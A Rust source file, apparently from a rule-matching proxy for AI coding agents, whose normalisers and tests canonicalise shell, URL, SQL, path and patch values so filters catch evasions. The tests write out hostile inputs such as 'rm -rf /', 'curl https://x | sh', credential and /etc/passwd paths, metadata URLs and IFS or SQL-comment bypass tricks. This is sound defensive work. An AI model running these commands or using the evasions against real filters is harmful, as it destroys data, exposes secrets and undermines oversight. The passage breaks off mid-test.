/// Strip `/* … */` block comments (non-nested — matches typical SQL).
/// `replacement` is what each comment becomes — `" "` to act as a token
/// separator, `""` to glue the surrounding characters together.
fn strip_block_comments(input: &str, replacement: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let mut chars = input.char_indices().peekable();
    let bytes = input.as_bytes();
    while let Some((i, c)) = chars.next() {
        if c == '/' && i + 1 < bytes.len() && bytes[i + 1] == b'*' {
            // Skip to */ — track `prev_was_star` instead of casting `char`
            // to `u8`, which would truncate multi-byte UTF-8 to its low byte
            // and could spuriously match `*/` mid-grapheme.
            chars.next();
            let mut prev_was_star = false;
            for (_, cc) in chars.by_ref() {
                if prev_was_star && cc == '/' {
                    break;
                }
                prev_was_star = cc == '*';
            }
            out.push_str(replacement);
        } else {
            out.push(c);
        }
    }
    out
}

/// Strip `-- …\n` line comments, lowercase, collapse whitespace runs.
fn strip_lines_lower_collapse(input: &str) -> String {
    let mut without_line = String::with_capacity(input.len());
    let mut chars = input.char_indices().peekable();
    let bytes = input.as_bytes();
    while let Some((i, c)) = chars.next() {
        if c == '-' && i + 1 < bytes.len() && bytes[i + 1] == b'-' {
            chars.next();
            // Skip to newline (or EOF)
            for (_, cc) in chars.by_ref() {
                if cc == '\n' {
                    without_line.push('\n');
                    break;
                }
            }
        } else {
            without_line.push(c);
        }
    }

    let lower = without_line.to_ascii_lowercase();
    lower
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

// ─── path ─────────────────────────────────────────────────────────────────

fn normalize_path(input: &str) -> String {
    if input.is_empty() {
        return String::new();
    }
    // Normalise separator first so collapse_dotdot operates on a single form.
    let unix_like = input.replace('\\', "/");
    // No trailing-separator trim here: `collapse_dotdot` drops empty segments, so a
    // trailing `/` cannot survive it and the only `/`-terminated form it can return is
    // the root itself. Re-adding a trim would be dead code — keep the invariant in
    // `collapse_dotdot` instead, where it is enforced.
    collapse_dotdot(&unix_like)
}

// ─── patch ────────────────────────────────────────────────────────────────

/// The header markers of the patch envelope that name a file: one the patch
/// adds, deletes or updates, and the file an update is moved to. Both clients
/// read a header from the TRIMMED line and its path as the rest of it. The
/// markers are spelled without the space the grammar puts after the colon, so
/// a header missing it is read too — over-reading is the safe direction.
const PATCH_TARGET_MARKERS: [&str; 4] =
    ["*** Add File:", "*** Delete File:", "*** Update File:", "*** Move to:"];

/// What either client trims off a header line and its path: Rust's whitespace
/// (Codex) and JavaScript's (OpenCode), which adds U+FEFF. Trimming the union
/// reads every header either client reads.
fn is_patch_trimmed(c: char) -> bool {
    c.is_whitespace() || c == '\u{feff}'
}

/// Every file a patch envelope names, `path`-normalised, in order of first
/// appearance and once each. Any line whose trimmed text starts with a marker
/// is read as a header — one inside a hunk's body included, which no client
/// applies as a file: a rule then sees one path too many, never one too few.
///
/// A value naming no file (not a patch, or a patch the clients would refuse)
/// is offered whole as one form, so a rule's needle still meets its text and
/// the field never resolves to nothing.
fn normalize_patch_forms(input: &str) -> Vec<String> {
    let mut seen = std::collections::HashSet::new();
    let mut targets: Vec<String> = Vec::new();
    for line in input.lines() {
        let header = line.trim_matches(is_patch_trimmed);
        let Some(target) = PATCH_TARGET_MARKERS.iter().find_map(|m| header.strip_prefix(m)) else {
            continue;
        };
        let target = target.trim_matches(is_patch_trimmed);
        if target.is_empty() {
            continue;
        }
        let path = normalize_path(target);
        if seen.insert(path.clone()) {
            targets.push(path);
        }
    }
    if targets.is_empty() { vec![input.to_string()] } else { targets }
}

/// Lexical `..` collapse — pure string operation, no fs access. Preserves
/// leading `~`, leading `/`, leading `./`, and root `/`. `..` segments
/// without a parent (`../foo`) are kept since collapsing them would invent
/// state we don't have.
fn collapse_dotdot(input: &str) -> String {
    let leading_slash = input.starts_with('/');
    let segments: Vec<&str> = input.split('/').collect();
    let mut stack: Vec<&str> = Vec::with_capacity(segments.len());
    for seg in segments {
        match seg {
            "" => {
                // Repeated `//` collapses to one — except we preserve the
                // leading slash via `leading_slash` below.
            }
            "." => {}
            ".." => {
                // Pop unless top of stack is also `..` (we can't collapse
                // past an unknown anchor) or the path was rooted (trying
                // to escape root is meaningless — keep it gone).
                if stack
                    .last()
                    .map(|t| *t == ".." || *t == "~")
                    .unwrap_or(true)
                {
                    if !leading_slash {
                        // Only push the literal `..` when not rooted.
                        stack.push("..");
                    }
                } else {
                    stack.pop();
                }
            }
            other => stack.push(other),
        }
    }
    if leading_slash {
        format!("/{}", stack.join("/"))
    } else if stack.is_empty() {
        ".".to_string()
    } else {
        stack.join("/")
    }
}

// ─── tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_normaliser_kind_is_listed_once() {
        // The schema is derived from the enum itself, so it names every
        // variant; `ALL` is the hand-kept list that must match it.
        let schema = serde_json::to_value(<Normalizer as utoipa::PartialSchema>::schema())
            .expect("the schema serialises");
        let derived: Vec<&str> = schema["enum"]
            .as_array()
            .expect("a string enum's schema lists its values")
            .iter()
            .filter_map(serde_json::Value::as_str)
            .collect();
        let listed: Vec<&str> = Normalizer::ALL.iter().map(|n| n.as_str()).collect();
        assert_eq!(listed, derived);
    }

    #[test]
    fn shell_unwraps_a_clustered_dash_c() {
        assert_eq!(normalize_shell("bash -lc 'rm  -rf /'"), "bash -lc rm -rf /");
        let heads: Vec<&str> =
            shell_argv("bash -lc rm -rf /").iter().filter_map(|a| a.first().copied()).collect();
        assert_eq!(heads, ["bash", "rm"]);
        // A double-dash option is not a cluster, and a flag without `c` is not `-c`.
        assert!(!is_dash_c_flag("--c"));
        assert!(!is_dash_c_flag("-l"));
        assert!(!is_dash_c_flag("-"));
        assert!(!is_dash_c_flag("-1c"));
    }

    #[test]
    fn a_shell_runs_its_first_operand_after_its_options() {
        fn at(line: &str) -> Option<&str> {
            let tokens: Vec<&str> = line.split(' ').collect();
            dash_c_command_at(&tokens).map(|i| tokens[i])
        }
        // A shell runs the first operand once an option cluster held `c`,
        // wherever the cluster sat and whatever options follow it.
        assert_eq!(at("bash -ec -c CMD"), Some("CMD"));
        assert_eq!(at("bash -c -e CMD"), Some("CMD"));
        assert_eq!(at("bash -o pipefail -c CMD"), Some("CMD"));
        assert_eq!(at("/bin/sh -c -- CMD"), Some("CMD"));
        assert_eq!(at("zsh +x -lc CMD arg0"), Some("CMD"));
        // No `-c`: a script file, not a command string.
        assert_eq!(at("bash script.sh"), None);
        assert_eq!(at("bash -e script.sh"), None);
        // `python` takes the command as the option's own argument.
        assert_eq!(at("python3 -W ignore -c CMD"), Some("CMD"));
        assert_eq!(at("python3 -Ic CMD"), Some("CMD"));
        // A `-c` with nothing after it names no command.
        assert_eq!(at("bash -c"), None);
        assert_eq!(at("python3 -c"), None);
        // An `o` in a cluster takes the next word, as do the long options with
        // a value; a lone `-` ends the options like `--`.
        assert_eq!(at("bash -euo pipefail -c CMD"), Some("CMD"));
        assert_eq!(at("bash -co pipefail CMD"), Some("CMD"));
        assert_eq!(at("bash --rcfile /dev/null -c CMD"), Some("CMD"));
        assert_eq!(at("bash --login -c CMD"), Some("CMD"));
        assert_eq!(at("sh -c - CMD"), Some("CMD"));
        // An option this table does not know to take a value still leaves the
        // word after `-c` read as the command.
        assert_eq!(at("bash --unknown-with-value VALUE -c CMD"), Some("CMD"));
        // ...and in the flattened stream the command's own `-c` (`wc -c`)
        // never stands in for the interpreter's.
        assert_eq!(at("bash --unknown-with-value VALUE -c wc -c secret"), Some("wc"));
        // A non-POSIX interpreter's `c` closes its cluster: an option with a
        // value holding a `c` is not `-c`.
        assert_eq!(at("fish -dconfig -c CMD"), Some("CMD"));
    }

    #[test]
    fn patch_reads_every_file_header_once() {
        let patch = "*** Begin Patch\r\n\
                     *** Add File: new.txt\r\n+hi\r\n\
                     *** Delete File: old/../gone.txt\r\n\
                     \t*** Update File:src/a.rs  \r\n\
                     *** Move to: src/b.rs\r\n@@\r\n-a\r\n+b\r\n\
                     *** Update File: new.txt\r\n\
                     *** End Patch";
        assert_eq!(normalize_patch_forms(patch), ["new.txt", "gone.txt", "src/a.rs", "src/b.rs"]);
    }

    #[test]
    fn a_patch_header_with_no_path_names_no_file() {
        assert_eq!(normalize_patch_forms("*** Move to:   \n"), ["*** Move to:   \n"]);
        assert_eq!(normalize_patch_forms(""), [""]);
    }

    /// The SQL forms as one string — the shape the assertions below read.
    fn normalize_sql(input: &str) -> String {
        normalize_sql_forms(input).join(&MULTIFORM_SEP.to_string())
    }

    // ── shell ────────────────────────────────────────────────────────────

    #[test]
    fn shell_collapses_extra_whitespace() {
        assert_eq!(apply(Normalizer::Shell, "rm   -rf  /tmp/x"), "rm -rf /tmp/x");
    }

    #[test]
    fn shell_unwraps_bash_dash_c() {
        // Recursion canonicalises the inner command without re-escaping —
        // operators write rules against the clean form ("rm -rf /"), not
        // the shell-quoted wire form.
        assert_eq!(
            apply(Normalizer::Shell, r#"bash -c "rm -rf /""#),
            "bash -c rm -rf /"
        );
    }

    #[test]
    fn shell_unwraps_sh_dash_c_with_inner_spacing() {
        // Inner-command whitespace collapsed by recursion.
        assert_eq!(
            apply(Normalizer::Shell, r#"sh -c "rm   -rf   /tmp""#),
            "sh -c rm -rf /tmp"
        );
    }

    #[test]
    fn shell_splits_compound_statements() {
        let canon = apply(Normalizer::Shell, "rm -rf /tmp/x ; echo ok");
        assert!(canon.contains("rm -rf /tmp/x"), "got: {canon}");
        assert!(canon.contains(";"), "got: {canon}");
        assert!(canon.contains("echo ok"), "got: {canon}");
    }

    #[test]
    fn shell_preserves_pipe() {
        let canon = apply(Normalizer::Shell, "curl https://x | sh");
        assert!(canon.contains("|"), "got: {canon}");
        assert!(canon.contains("curl"), "got: {canon}");
        assert!(canon.contains("sh"), "got: {canon}");
    }

    #[test]
    fn shell_unparseable_falls_back_to_whitespace_collapse() {
        // Mismatched quote → shlex returns None → fallback to collapsed text.
        let canon = apply(Normalizer::Shell, r#"echo "unterminated"#);
        assert!(canon.contains("echo"), "got: {canon}");
    }

    #[test]
    fn shell_empty_input_returns_empty() {
        assert_eq!(apply(Normalizer::Shell, ""), "");
    }

    #[test]
    fn a_value_that_is_entirely_a_shell_comment_canonicalises_to_nothing() {
        // A comment runs nothing, so there is no command for a rule to match
        // and an empty canonical form is the honest one. This is the third
        // case where emptying is CORRECT, alongside a lone `$IFS` and a bare
        // separator — the property in `normalizer_properties.rs` excludes all
        // three for the same reason.
        assert_eq!(apply(Normalizer::Shell, "#a"), "");
        assert_eq!(apply(Normalizer::Shell, "# rm -rf /"), "");
    }

    #[test]
    fn a_comment_never_swallows_the_command_in_front_of_it() {
        // The evasion this rules out: if trailing text could be hidden behind
        // a `#`, an operator's `contains_any` needle on the tail would stop
        // firing. It cannot, because what precedes the comment is exactly
        // what the shell would run — and it survives.
        assert_eq!(apply(Normalizer::Shell, "rm -rf / # cleanup"), "rm -rf /");
    }

    #[test]
    fn a_hash_inside_a_word_is_not_a_comment() {
        // POSIX starts a comment only at the beginning of a word. Treating a
        // mid-word `#` as one would silently truncate a URL fragment or an
        // anchored path — and truncation is a bypass, because a rule reading
        // the tail would match nothing while the real shell still ran it.
        assert_eq!(
            apply(Normalizer::Shell, "curl https://evil.test/a#b"),
            "curl https://evil.test/a#b"
        );
        assert_eq!(apply(Normalizer::Shell, "echo a#b"), "echo a#b");
    }

    #[test]
    fn shell_expands_dollar_ifs_evasion() {
        // `$IFS` is the IFS-expansion bypass — bash's word splitter expands
        // it to whitespace, so a rule blocking `rm -rf` was historically
        // bypassed by writing `rm$IFS-rf`.
        assert_eq!(apply(Normalizer::Shell, "rm$IFS-rf"), "rm -rf");
    }

    #[test]
    fn shell_expands_brace_ifs_evasion() {
        assert_eq!(apply(Normalizer::Shell, "rm${IFS}-rf"), "rm -rf");
    }

    #[test]
    fn shell_expands_braced_ifs_substring_evasion() {
        // `${IFS%??}` (IFS minus last 2 chars), `${IFS:0:1}` (first char of
        // IFS), `${IFS#?}` are common substring tricks. Match any body up
        // to the closing brace.
        assert_eq!(apply(Normalizer::Shell, "rm${IFS%??}-rf"), "rm -rf");
        assert_eq!(apply(Normalizer::Shell, "rm${IFS:0:1}-rf"), "rm -rf");
        assert_eq!(apply(Normalizer::Shell, "rm${IFS#?}-rf"), "rm -rf");
    }

    #[test]
    fn shell_does_not_expand_partial_ifs_match() {
        // `$IFSx` is a different parameter (`IFSx`); leave it alone so we
        // don't invent state. The token stays as-is.
        let canon = apply(Normalizer::Shell, "echo $IFSPATH");
        assert!(canon.contains("$IFSPATH"), "got: {canon}");
    }

    #[test]
    fn shell_expands_ifs_inside_bash_dash_c() {
        // Recursion: inner script also has IFS evasion which must be
        // canonicalised after the outer shlex unwraps the wrapper.
        let canon = apply(Normalizer::Shell, r#"bash -c "rm$IFS-rf /""#);
        assert!(canon.contains("rm -rf /"), "got: {canon}");
    }

    #[test]
    fn shell_expands_multiple_ifs_in_one_command() {
        let canon = apply(Normalizer::Shell, "cat$IFS/etc/passwd$IFS|$IFS sh");
        assert!(canon.contains("cat"), "got: {canon}");
        assert!(canon.contains("/etc/passwd"), "got: {canon}");
    }

    #[test]
    fn shell_unclosed_brace_ifs_left_literal() {
        // Missing `}` — fallback is to leave the `$` as a literal so we
        // don't consume to EOF and lose downstream tokens. The pre-pass
        // emits the `$` verbatim; whether shlex then parses or falls back
        // to whitespace-collapse depends on the rest of the input.
        let canon = apply(Normalizer::Shell, "echo ${IFS no close");
        // The `$` and the unclosed `${IFS` body must survive — verifying
        // the literal substring catches a bug that ate everything past
        // `${`. `${IFS` should appear verbatim in the canonical form.
        assert!(canon.contains("echo"), "command head missing: {canon}");
        assert!(canon.contains("${IFS"), "unclosed expansion not preserved: {canon}");
    }

    #[test]
    fn shell_nested_ifs_safe_degradation() {
        // `${${IFS}}` is a syntax error in real bash and not a real attack,
        // but the pre-pass must not panic, must not consume past the input,
        // and must leave behind something a downstream tokeniser can chew
        // on. Lock in the current safe-degradation behavior.
        let canon = apply(Normalizer::Shell, "echo ${${IFS}}");
        // The inner `${IFS}` expands; the outer brace pair becomes ` }`,
        // which shlex tolerates as literal text.
        assert!(canon.contains("echo"), "got: {canon}");
        // Whatever else canon contains, it must not be empty and must not
        // have grown unboundedly.
        assert!(!canon.is_empty(), "must not empty input on nested expansion");
        assert!(canon.len() < 64, "no runaway growth, got: {canon}");
    }

    #[test]
    fn shell_recursion_bounded() {
        // Hand-crafted depth that would explode unbounded recursion.
        let mut input = String::from("echo done");
        for _ in 0..10 {
            input = format!("bash -c \"{}\"", input.replace('"', "\\\""));
        }
        let canon = apply(Normalizer::Shell, &input);
        assert!(!canon.is_empty(), "must produce non-empty output");
    }

    // ── url ──────────────────────────────────────────────────────────────

    #[test]
    fn url_lowercases_scheme_and_host() {
        assert_eq!(
            apply(Normalizer::Url, "HTTPS://Example.COM/Path"),
            "https://example.com/Path"
        );
    }

    #[test]
    fn url_aliases_metadata_hosts_to_link_local_ip() {
        assert_eq!(
            apply(Normalizer::Url, "http://metadata.google.internal/v1/instance"),
            "http://169.254.169.254/v1/instance"
        );
        assert_eq!(
            apply(Normalizer::Url, "http://metadata.azure.com/v1"),
            "http://169.254.169.254/v1"
        );
    }

    #[test]
    fn url_percent_decodes_path() {
        assert_eq!(
            apply(Normalizer::Url, "http://x.com/v1%2Finstance%2Fid"),
            "http://x.com/v1/instance/id"
        );
    }

    #[test]
    fn url_preserves_port() {
        assert_eq!(
            apply(Normalizer::Url, "https://Example.com:8443/x"),
            "https://example.com:8443/x"
        );
    }

    #[test]
    fn url_preserves_userinfo() {
        assert_eq!(
            apply(Normalizer::Url, "https://user:pass@Example.com/x"),
            "https://user:pass@example.com/x"
        );
    }

    #[test]
    fn url_no_scheme_returns_lowercased() {
        // No `://` → return lowercased (best-effort; not really a URL).
        assert_eq!(apply(Normalizer::Url, "Foo.Bar/x"), "foo.bar/x");
    }

    #[test]
    fn url_empty_input_returns_empty() {
        assert_eq!(apply(Normalizer::Url, ""), "");
    }

    // ── sql ──────────────────────────────────────────────────────────────

    #[test]
    fn sql_lowercases_and_collapses_whitespace() {
        assert_eq!(
            apply(Normalizer::Sql, "SELECT  *\n  FROM   users"),
            "select * from users"
        );
    }

    #[test]
    fn sql_strips_block_comments() {
        assert_eq!(
            apply(Normalizer::Sql, "DROP /* not really */ TABLE users"),
            "drop table users"
        );
    }

    #[test]
    fn sql_strips_line_comments() {
        assert_eq!(
            apply(Normalizer::Sql, "DROP TABLE users -- but not really\n"),
            "drop table users"
        );
    }

    #[test]
    fn sql_intra_keyword_comment_split_defeated() {
        // `DR/**/OP TABLE` — empty-replace reforms the keyword so
        // `contains "drop"` fires; space-replace keeps the broken form
        // available too. Both ride in the canonical via MULTIFORM_SEP.
        let canon = apply(Normalizer::Sql, "DR/**/OP TABLE users");
        assert!(canon.contains("drop table users"), "expected reformed keyword in canonical, got: {canon}");
        assert!(canon.contains("dr op table users"), "expected broken form in canonical, got: {canon}");
    }

    #[test]
    fn sql_attached_block_comment_defeated() {
        // No spaces around the comment: empty-replace produces `droptable`,
        // space-replace produces `drop table`. Both should appear.
        let canon = apply(Normalizer::Sql, "DROP/**/TABLE users");
        assert!(canon.contains("droptable"), "got: {canon}");
        assert!(canon.contains("drop table"), "got: {canon}");
    }

    #[test]
    fn sql_double_evasion_union_select_defeated() {
        // `UN/**/ION SEL/**/ECT` — both keywords split. Empty-replace
        // reforms them: `union select`. Match against keyword-only rules.
        let canon = apply(Normalizer::Sql, "UN/**/ION SEL/**/ECT * FROM x");
        assert!(canon.contains("union"), "expected reformed UNION, got: {canon}");
        assert!(canon.contains("select"), "expected reformed SELECT, got: {canon}");
    }

    #[test]
    fn sql_inter_keyword_no_space_defeated() {
        // `UNION/* */SELECT` — comment as separator with no surrounding
        // whitespace. Space-replace produces `union select`.
        let canon = apply(Normalizer::Sql, "UNION/* x */SELECT");
        assert!(canon.contains("union select"), "got: {canon}");
    }

    #[test]
    fn sql_dual_form_uses_nul_separator() {
        // When the two forms differ, they're joined by `\u{0}` so the
        // matcher can split. Surface the contract here so future readers
        // who change the separator break a test, not a downstream consumer.
        let canon = apply(Normalizer::Sql, "DR/**/OP TABLE x");
        assert!(canon.contains(MULTIFORM_SEP), "expected NUL separator, got bytes: {:?}", canon.as_bytes());
        let parts: Vec<&str> = canon.split(MULTIFORM_SEP).collect();
        assert_eq!(parts.len(), 2, "expected 2 forms, got: {canon}");
    }

    #[test]
    fn sql_single_form_when_replacements_collapse() {
        // `DROP TABLE users` has no comments — both forms produce the same
        // canonical, so output is a single form (no NUL).
        let canon = apply(Normalizer::Sql, "DROP TABLE users");
        assert_eq!(canon, "drop table users");
        assert!(!canon.contains(MULTIFORM_SEP), "should be single form, got: {canon}");
    }

    // ── separator hygiene ────────────────────────────────────────────────

    /// The separator says "here is where one canonical form ends" — so a value
    /// may only carry one this module put there. `url` percent-decodes, which
    /// is how an argument gets to try: `%00` decodes to the separator itself.
    #[test]
    fn an_argument_can_never_manufacture_a_form_boundary() {
        for (n, input) in [
            (Normalizer::Url, "https://evil.com/pa%00th"),
            (Normalizer::Url, "https://evil.com/pa\u{0}th"),
            (Normalizer::Raw, "evil.com/pa\u{0}th"),
            (Normalizer::Shell, "curl https://evil.com/pa\u{0}th"),
            (Normalizer::Path, "/etc/pa\u{0}sswd"),
            (Normalizer::Sql, "drop\u{0}table users"),
        ] {
            for form in apply_forms(n, input) {
                assert!(
                    !form.contains(MULTIFORM_SEP),
                    "{n:?} let {input:?} manufacture a form boundary: {form:?}"
                );
            }
        }
    }

    /// Which side the removal falls on matters: the canonical value reads as
    /// the string the operator's needle names, so a `contains` rule fires
    /// rather than being cut in half at a position the caller picked.
    #[test]
    fn a_split_attempt_canonicalises_to_the_unsplit_value() {
        assert_eq!(
            apply(Normalizer::Url, "https://evil.com/pa%00th"),
            "https://evil.com/path"
        );
    }

    /// The genuine ambiguity is still two forms — the hygiene above must not
    /// have collapsed the one case that legitimately has a boundary.
    #[test]
    fn sql_still_returns_both_comment_forms_as_a_list() {
        assert_eq!(
            apply_forms(Normalizer::Sql, "DR/**/OP TABLE x"),
            vec!["drop table x", "dr op table x"]
        );
    }

    #[test]
    fn sql_destructive_keyword_canonicalises_case() {
        // Both upper and lower forms canonicalise to the same string.
        assert_eq!(
            apply(Normalizer::Sql, "drop table x"),
            apply(Normalizer::Sql, "DROP TABLE x")
        );
    }

    // ── path ─────────────────────────────────────────────────────────────

    #[test]
    fn path_collapses_dotdot() {
        assert_eq!(
            apply(Normalizer::Path, "/etc/.././etc/passwd"),
            "/etc/passwd"
        );
    }

    #[test]
    fn path_preserves_tilde_does_not_expand() {
        // Tilde stays — proxy host's $HOME is meaningless to the agent host.
        assert_eq!(
            apply(Normalizer::Path, "~/.aws/../.aws/credentials"),
            "~/.aws/credentials"
        );
    }

    #[test]
    fn path_normalises_separator() {
        assert_eq!(
            apply(Normalizer::Path, "C:\\Users\\foo\\.aws\\credentials"),
            "C:/Users/foo/.aws/credentials"
        );
    }

    #[test]
    fn path_trims_trailing_slash_except_root() {
        assert_eq!(apply(Normalizer::Path, "/etc/foo/"), "/etc/foo");
        assert_eq!(apply(Normalizer::Path, "/"), "/");
    }

    #[test]
    fn path_does_not_escape_root() {
        // Trying to escape root is meaningless lexically; we drop the ..
        assert_eq!(apply(Normalizer::Path, "/../etc/passwd"), "/etc/passwd");
    }

    #[test]
    fn path_keeps_leading_dotdot_when_not_rooted() {
        // Relative path with leading .. — we can't collapse past an unknown
        // anchor, so keep the .. literal.
        assert_eq!(apply(Normalizer::Path, "../foo/bar"), "../foo/bar");
    }

    #[test]
    fn path_empty_returns_empty() {
        assert_eq!(apply(Normalizer::Path, ""), "");
    }

    // ── raw ──────────────────────────────────────────────────────────────

    #[test]
    fn raw_is_identity() {
        assert_eq!(
            apply(Normalizer::Raw, "literally  anything\n  here"),
            "literally  anything\n  here"
        );
    }

    // ── non-ASCII / UTF-8 boundaries ─────────────────────────────────────
    //
    // The module contract ("Pure; never panics") rules out a byte-index
    // slice landing mid-codepoint when a single-byte separator (`;` `|`)
    // follows a multi-byte character. These cases exercise every
    // normaliser on inputs whose byte length exceeds char count.

    #[test]
    fn shell_handles_multibyte_before_separator() {
        // `é` is two bytes: an `&input[0..1]` slice would land in the middle
        // of the codepoint and panic.
        let canon = apply(Normalizer::Shell, "echo 'é';ls");
        assert!(canon.contains(';'), "expected separator, got: {canon}");
        assert!(canon.contains("echo"), "got: {canon}");
        assert!(canon.contains("ls"), "got: {canon}");
    }

    #[test]
    fn shell_handles_cjk_arguments() {
        // CJK chars are 3-byte UTF-8 sequences.
        let canon = apply(Normalizer::Shell, "rm 你好;echo done");
        assert!(canon.contains("你好"), "got: {canon}");
        assert!(canon.contains(';'), "got: {canon}");
    }

    #[test]
    fn shell_handles_emoji_arguments() {
        // 4-byte UTF-8 sequences.
        let canon = apply(Normalizer::Shell, "echo '🔥 fire' | tr a-z A-Z");
        assert!(canon.contains('🔥'), "got: {canon}");
        assert!(canon.contains('|'), "got: {canon}");
    }

    #[test]
    fn shell_handles_multibyte_around_double_separator() {
        // `&&` is two bytes — exercises the multi-char separator path right
        // after a multi-byte codepoint.
        let canon = apply(Normalizer::Shell, "echo café && ls");
        assert!(canon.contains("café"), "got: {canon}");
        assert!(canon.contains("&&"), "got: {canon}");
    }

    #[test]
    fn shell_handles_multibyte_only_input() {
        // Pure non-ASCII with no separators — must not panic and must round-trip.
        let canon = apply(Normalizer::Shell, "你好世界");
        assert!(canon.contains("你好世界"), "got: {canon}");
    }

    #[test]
    fn url_handles_multibyte_in_path() {
        // Non-ASCII in path is left as-is after percent-decode + lowercase
        // of scheme/host.
        let canon = apply(Normalizer::Url, "HTTPS://Example.COM/café/路径");
        assert!(canon.starts_with("https://example.com/"), "got: {canon}");
        assert!(canon.contains("café"), "got: {canon}");
        assert!(canon.contains("路径"), "got: {canon}");
    }

    #[test]
    fn sql_handles_multibyte_literals() {
        // Comment stripping and whitespace collapse must not corrupt
        // multi-byte chars in literals.
        let canon = apply(Normalizer::Sql, "SELECT 'café' /* x */ FROM users");
        assert!(canon.contains("café"), "got: {canon}");
        assert!(!canon.contains("/*"), "comment must be stripped: {canon}");
    }

    #[test]
    fn path_handles_multibyte_segments() {
        let canon = apply(Normalizer::Path, "/home/用户/.aws/../.aws/credentials");
        assert_eq!(canon, "/home/用户/.aws/credentials");
    }

    #[test]
    fn raw_handles_multibyte_identity() {
        let input = "🔥 你好 café \u{200B}zwsp\u{FEFF}bom";
        assert_eq!(apply(Normalizer::Raw, input), input);
    }

    // ── enum tag ─────────────────────────────────────────────────────────

    #[test]
    fn normalizer_str_tags_match_serde_rename() {
        for n in [
            Normalizer::Shell,
            Normalizer::Url,
            Normalizer::Sql,
            Normalizer::Path,
            Normalizer::Raw,
        ] {
            let json = serde_json::to_string(&n).unwrap();
            let stripped = json.trim_matches('"');
            assert_eq!(stripped, n.as_str(), "as_str must match serde");
        }
    }

    // ── shell_argv ────────────────────────────────────────────────────────

    /// Candidate argv vectors for `input`, as space-joined strings — easier to
    /// assert on than nested slices.
    fn argv_of(input: &str) -> Vec<String> {
        shell_argv(&normalize_shell(input))
            .into_iter()
            .map(|tokens| tokens.join(" "))
            .collect()
    }

    /// Position 0 of every candidate — what an `argv[0]` rule matches against.
    fn heads_of(input: &str) -> Vec<String> {
        shell_argv(&normalize_shell(input))
            .into_iter()
            .filter_map(|tokens| tokens.first().map(|t| (*t).to_string()))
            .collect()
    }

    #[test]
    fn shell_argv_returns_the_plain_token_list() {
        assert_eq!(argv_of("rm -rf /tmp/x"), vec!["rm -rf /tmp/x"]);
        assert_eq!(heads_of("rm -rf /tmp/x"), vec!["rm"]);
    }

    /// Every command in a chain gets its own vector. Reading position 0 of the
    /// whole string would let a harmless leading command shield the rest —
    /// the same evasion `is_destructive_sql` closes by splitting on `;`.
    #[test]
    fn shell_argv_gives_each_chained_command_its_own_head() {
        for chain in [
            "echo hi; rm -rf /",
            "echo hi && rm -rf /",
            "echo hi || rm -rf /",
            "cat f | rm -rf /",
            "echo hi\nrm -rf /",
        ] {
            assert!(
                heads_of(chain).contains(&"rm".to_string()),
                "chained command hidden from argv[0]: {chain}"
            );
        }
    }

    /// A wrapper is peeled so the command it runs is also a candidate head,
    /// while the wrapper itself stays one — a rule may legitimately name
    /// either.
    #[test]
    fn shell_argv_sees_through_command_wrappers() {
        for wrapped in [
            "sudo rm -rf /",
            "sudo -u root rm -rf /",
            "env FOO=bar rm -rf /",
            "nohup rm -rf /",
            "sudo env FOO=1 rm -rf /",
            "bash -c 'rm -rf /'",
            "sh -c \"rm -rf /\"",
        ] {
            assert!(
                heads_of(wrapped).contains(&"rm".to_string()),
                "wrapped command hidden from argv[0]: {wrapped}"
            );
        }
        assert!(heads_of("sudo rm -rf /").contains(&"sudo".to_string()));
    }

    /// `timeout` puts its own DURATION where the command would be, and
    /// `stdbuf` its buffering mode — both are skipped by shape, so the command
    /// behind them is a candidate head while the wrapper stays one too.
    #[test]
    fn shell_argv_skips_a_wrappers_own_operand_and_flag_values() {
        for wrapped in [
            "timeout 5 rm -rf /",
            "timeout 0.5s rm -rf /",
            "timeout -k 30 5 rm -rf /",
            "timeout --signal=KILL 5 rm -rf /",
            "stdbuf -oL rm -rf /",
            "stdbuf -o L rm -rf /",
            "stdbuf -i 0 -o L rm -rf /",
        ] {
            assert!(
                heads_of(wrapped).contains(&"rm".to_string()),
                "wrapped command hidden from argv[0]: {wrapped}"
            );
        }
        assert!(heads_of("timeout 5 rm -rf /").contains(&"timeout".to_string()));
    }

    /// Both directions of the value-flag table, because each is wrong in its own
    /// way. A boolean listed as value-taking eats the wrapped command and offers
    /// the flag's neighbour as the head — a wrong answer. A value-taking flag left
    /// out reads its value as the command — a miss. `-i` is the trap for the first
    /// (boolean for `sudo` and `env`, a value flag for `stdbuf`) and a short
    /// spelling for the second (`sudo -T`, `doas -a`).
    #[test]
    fn a_wrappers_own_flags_never_become_the_command() {
        for wrapped in [
            "sudo -i rm -rf /",
            "env -i rm -rf /",
            "sudo -n rm -rf /",
            "sudo -T 30 rm -rf /",
            "sudo --command-timeout 30 rm -rf /",
            "doas -a pam rm -rf /",
        ] {
            let heads = heads_of(wrapped);
            assert!(
                heads.contains(&"rm".to_string()),
                "a wrapper flag hid the command: {wrapped} → {heads:?}"
            );
            assert!(
                !heads.iter().any(|h| h.starts_with('-')),
                "peel offered an option as a command head: {wrapped} → {heads:?}"
            );
        }
    }

    /// `busybox` is an applet dispatcher, so the applet is the command — and
    /// `busybox sh` is therefore a shell, which is what makes it a code sink.
    #[test]
    fn shell_argv_reaches_a_busybox_applet() {
        assert!(heads_of("busybox sh").contains(&"sh".to_string()));
        assert!(heads_of("busybox sh -c 'rm -rf /'").contains(&"rm".to_string()));
        assert!(heads_of("busybox sh").contains(&"busybox".to_string()));
        // Its own options name no applet — there is nothing to peel to.
        assert_eq!(heads_of("busybox --list"), vec!["busybox"]);
    }

    /// `xargs` builds commands from stdin rather than exec'ing its tail, so it
    /// is deliberately not peeled and reads as its own head: a miss, never a
    /// wrong answer. Same for a `timeout` whose operand is not a duration —
    /// that invocation is not the shape the table describes.
    #[test]
    fn shell_argv_leaves_command_building_wrappers_alone() {
        assert_eq!(heads_of("xargs -I{} rm -rf /"), vec!["xargs"]);
        assert_eq!(heads_of("timeout rm -rf /"), vec!["timeout"]);
    }

    /// A duration is digits AND nothing else — both halves, because either one
    /// alone accepts a token that is plainly a command and skips it, which puts
    /// the command's own first ARGUMENT at position 0. `python3` carries a digit
    /// among letters; `...` carries none among characters a number may contain.
    #[test]
    fn a_wrapper_operand_that_is_not_a_duration_is_not_skipped() {
        for line in [
            "timeout python3 -c echo",
            "timeout ... rm -rf /",
            "timeout 5x rm -rf /",
        ] {
            assert_eq!(
